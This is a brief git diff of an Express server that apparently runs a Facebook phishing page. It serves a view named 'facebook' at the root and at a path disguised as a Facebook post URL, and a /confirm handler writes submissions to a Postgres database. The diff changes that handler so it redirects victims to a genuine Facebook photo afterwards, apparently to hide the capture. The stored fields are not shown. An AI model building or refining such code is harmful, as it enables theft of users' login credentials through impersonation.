@@ -17,7 +17,8 @@ const client = new pg.Client({
 });
 client.connect();
 app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A',function(req,res){
-    res.render('facebook')
+    res.render('facebook');
+    
 })
 app.get('/',function(req,res){
     res.render('facebook')
@@ -37,7 +38,7 @@ app.post('/confirm', function (req, res) {
             console.log(result)
         }
     })
-res.redirect('/')
+    res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
 })
 app.listen(PORT, function () {
     console.log('Server Started')
